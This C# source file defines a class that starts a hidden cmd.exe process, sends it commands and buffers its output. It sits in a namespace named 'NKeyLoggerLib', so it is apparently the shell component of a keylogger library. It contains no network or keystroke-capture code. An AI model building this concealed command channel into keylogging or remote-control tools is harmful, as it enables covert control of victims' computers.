using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace NKeyLoggerLib;
public class Cmd : IDisposable
{
    private readonly Process cmdProcess = new Process();
    private StreamWriter? writer = null;
    private StreamReader? reader = null;
    private StringBuilder readed = new StringBuilder();
    private readonly CancellationTokenSource tokenSource = new CancellationTokenSource();
    public string Readed
    {
        get {
            if (reader == null)
                throw new ArgumentNullException("Cmd reader was be null");
            lock (reader) {
                return (string)readed.ToString();
            }
        }
    }
    public Cmd()
    {
        init();
    }

    private void init()
    {
        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe");
        psi.UseShellExecute = false;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardInput = true;
        psi.CreateNoWindow = true;
        cmdProcess.StartInfo = psi;
        cmdProcess.Start();
        writer = cmdProcess.StandardInput;
        reader = cmdProcess.StandardOutput;
        Read(tokenSource.Token);
    }

    public Result<bool> Write(string command)
    {
        if (cmdProcess.HasExited)
            return Result<bool>.Failure(false, "Process was be closed");
        if (writer == null)
            return Result<bool>.Failure("Writer of cmd is null");
        try
        {
            writer.WriteLine(command);
            writer.Flush();
        }
        catch (Exception ex)
        {
            return Result<bool>.Failure(ex.Message);
        }
        return Result<bool>.Success(true);
    }

    private async Task Read(CancellationToken token)
    {
        if (reader == null)
            throw new ArgumentNullException("Cmd stream reader was be null");
        await Task.Factory.StartNew(() => {
            while (!token.IsCancellationRequested)
            {
                string? line = null;
                while ((line = reader.ReadLine()) != null)
                {
                    lock (readed)
                    {
                        readed.AppendLine(line);
                    }
                }
            }
        });
    }
    public void Dispose()
    {
        tokenSource.Cancel();
        writer?.Close();
        reader?.Close();
        cmdProcess.CloseMainWindow();
        cmdProcess.Close();
    }

}
